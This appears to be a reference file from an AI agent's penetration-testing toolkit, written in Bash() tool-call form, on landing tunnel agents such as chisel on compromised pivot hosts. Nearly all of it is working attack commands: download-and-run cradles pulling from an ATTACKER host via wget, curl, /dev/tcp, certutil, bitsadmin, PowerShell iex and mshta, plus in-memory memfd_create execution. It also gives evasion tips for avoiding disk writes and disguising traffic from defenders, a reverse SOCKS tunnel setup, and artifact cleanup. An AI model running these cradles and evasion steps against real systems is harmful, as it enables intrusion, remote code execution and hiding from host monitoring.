### Ref: Payload delivery (agent dropper)

**Root pattern:** Before chisel/ligolo-ng/any custom agent can run on the pivot, the binary has to land there. The cradle (the command on the pivot that fetches and runs the binary) depends on the OS, the available outbound channels, and how visible disk writes are to host monitoring. The standard pattern is: **stand up a tiny HTTP server on the attacker, then run a one-line download cradle on the pivot via your existing access channel** (web shell, RCE, meterpreter, ssh). For msfvenom-generated reverse-shell payloads (Linux ELF, Windows EXE, PHP, JSP, WAR, ASP), the payload table in `reverse-shell/SKILL.md:189-200` covers the syntax — this ref does NOT duplicate that and focuses on the dropper one-liners that fetch the binary onto the pivot.

**Step 1 — Stand up the attacker file server in tmux** (so it persists across `Bash` calls):

```
Bash("mkdir -p /tmp/dropzone && cd /tmp/dropzone && cp /usr/bin/chisel /tmp/dropzone/chisel 2>/dev/null")
Bash("tmux new-session -d -s httpserver 'cd /tmp/dropzone && python3 -m http.server 8080'")
Bash("sleep 1 && curl -sS -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:8080/chisel")
```

For HTTPS-only egress, use `uv run` to one-shot a TLS server:
```
Bash("openssl req -x509 -newkey rsa:2048 -keyout /tmp/srv.key -out /tmp/srv.crt -days 7 -nodes -subj '/CN=localhost'")
Bash("tmux new-session -d -s httpsserver 'cd /tmp/dropzone && uv run --with cryptography python -c \"import http.server, ssl; s=http.server.HTTPServer((\\\"0.0.0.0\\\",8443),http.server.SimpleHTTPRequestHandler); ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); ctx.load_cert_chain(\\\"/tmp/srv.crt\\\",\\\"/tmp/srv.key\\\"); s.socket=ctx.wrap_socket(s.socket,server_side=True); s.serve_forever()\"'")
```

---

#### Linux pivots

```
# wget (most common — present on every distro)
wget http://ATTACKER:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# curl
curl -sSO http://ATTACKER:8080/chisel && chmod +x ./chisel

# wget over HTTPS (skip cert verify on self-signed)
wget --no-check-certificate https://ATTACKER:8443/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# curl over HTTPS, in-memory exec via bash process substitution (no disk write)
bash -c "$(curl -sk https://ATTACKER:8443/agent.sh)"

# /dev/tcp fallback (when no wget / curl / nc available — useful on hardened minimal images)
exec 3<>/dev/tcp/ATTACKER/8080
echo -e 'GET /chisel HTTP/1.1\r\nHost: x\r\n\r\n' >&3
# Read past headers, then redirect body to a file (clunky — prefer wget when possible)

# Base64-via-existing-channel — when no outbound TCP at all, only your shell
# Attacker:
base64 -w0 /tmp/dropzone/chisel | xclip -i        # or pipe through whatever channel
# Pivot:
echo 'BASE64_BLOB' | base64 -d > /tmp/chisel && chmod +x /tmp/chisel

# Memory-only execution via memfd_create (Linux ≥ 3.17, no disk write)
# Useful for chisel/ligolo binaries when /tmp is noexec or monitored:
curl -sS http://ATTACKER:8080/chisel -o /proc/self/fd/3 3<<<""
# Or with python3:
python3 -c '
import os, urllib.request, ctypes
fd = ctypes.CDLL(None).memfd_create(b"x", 0)
data = urllib.request.urlopen("http://ATTACKER:8080/chisel").read()
os.write(fd, data)
os.execve(f"/proc/self/fd/{fd}", ["x", "client", "http://ATTACKER:8080", "R:1080:socks"], os.environ)
'
```

#### Windows pivots

```
# certutil — almost always available, predates EDR signatures (still flagged by modern AV)
certutil -urlcache -split -f http://ATTACKER:8080/chisel.exe C:\Windows\Temp\chisel.exe

# powershell Invoke-WebRequest
powershell -c "Invoke-WebRequest -Uri http://ATTACKER:8080/chisel.exe -OutFile C:\Windows\Temp\chisel.exe"
powershell -c "iwr http://ATTACKER:8080/chisel.exe -OutFile $env:TEMP\chisel.exe"

# powershell Net.WebClient (older, more compatible)
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8080/chisel.exe','C:\Windows\Temp\chisel.exe')"

# bitsadmin (slow but legitimate — looks like a Windows Update transfer)
bitsadmin /transfer chiselJob /download /priority normal http://ATTACKER:8080/chisel.exe C:\Windows\Temp\chisel.exe

# In-memory PowerShell — no disk write at all
powershell -c "iex (New-Object Net.WebClient).DownloadString('http://ATTACKER:8080/agent.ps1')"
powershell -c "iex(iwr http://ATTACKER:8080/agent.ps1 -UseBasicParsing)"

# PowerShell reflective EXE load (no .exe on disk — for chisel, requires wrapping in a PS1 loader)
# See PowerSploit Invoke-ReflectivePEInjection or Invoke-Expression with embedded base64 EXE.

# When PowerShell is locked down (Constrained Language Mode / AppLocker) — fall back to certutil
# or HTA-based delivery via mshta:
mshta http://ATTACKER:8080/dropper.hta
```

#### Cross-platform — pivoted-through tunnels

If the pivot only reaches the attacker via a SOCKS proxy that's *already* running (e.g., you've got an `ssh -D` tunnel or chisel SOCKS up first, and now want to drop a *second* agent on a deeper host that the first pivot can reach), tunnel the dropper too:

```
# Inside the attacker's shell, with SOCKS5 on 127.0.0.1:1080:
proxychains4 ssh user@DEEPER_HOST 'wget http://PIVOT1_INTERNAL:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel'
# Note: PIVOT1_INTERNAL must be running its own HTTP server hosting the binary —
# either copy the binary to pivot1 first, or use chisel's --backend to serve it from the same port as the tunnel.
```

---

**Hosting binaries on the chisel server itself** (combined dropper + tunnel endpoint — looks like a single web service to a network defender):

```
# Attacker — chisel server with HTTP backend (see refs/chisel.md):
chisel server -p 8080 --reverse --socks5 --backend http://localhost:8000 --auth user:s3cret &
python3 -m http.server 8000 --directory /tmp/dropzone

# Pivot — fetch the binary from the chisel server's HTTP face, then connect the tunnel:
wget http://ATTACKER:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client http://ATTACKER:8080 R:1080:socks --auth user:s3cret &
```

---

**Architecture matching** (do this BEFORE serving the binary — wrong arch = silent failure):

```
# Linux pivot:
uname -m
# x86_64       → amd64 release
# aarch64      → arm64 release
# armv7l       → armv7 release
# i686         → 386 release
# mips/mipsel  → check vendor docs (chisel & ligolo-ng both publish these)

# Windows pivot:
wmic os get osarchitecture
# 64-bit → amd64
# 32-bit → 386 (rare on modern hosts)
```

Stage multiple architectures in `/tmp/dropzone/` and let the cradle pick:
```
ls /tmp/dropzone/
chisel_linux_amd64  chisel_linux_arm64  chisel_linux_armv7  chisel_windows_amd64.exe
```

---

**Cleanup — tracked artifacts:**

Every drop creates an artifact; record each in a `note` event so Phase 13 cleanup can find them:
```
Bash("jq -nc --arg ts \"$(date -Iseconds)\" --arg msg 'Dropped /tmp/chisel on PIVOT_IP via wget cradle' '{ts:$ts,type:\"note\",msg:$msg}' >> pentest/events.jsonl")
```

At cleanup time:
- Linux pivot: `pkill -f /tmp/chisel; rm -f /tmp/chisel`
- Windows pivot: `taskkill /im chisel.exe /f & del C:\Windows\Temp\chisel.exe`
- Attacker: `tmux kill-session -t httpserver; tmux kill-session -t httpsserver`
- If certutil was used on Windows, also clear the URL cache: `certutil -urlcache -split -f http://ATTACKER:8080/chisel.exe delete`

---

**For msfvenom-generated reverse-shell binaries** (ELF / EXE / PHP / JSP / WAR / ASP / PS1):
The full msfvenom syntax table is in `reverse-shell/SKILL.md:189-200`. The same dropper cradles above apply — generate the payload with msfvenom on the attacker, drop it in `/tmp/dropzone/`, fetch via the cradle that fits the pivot's OS and outbound profile.
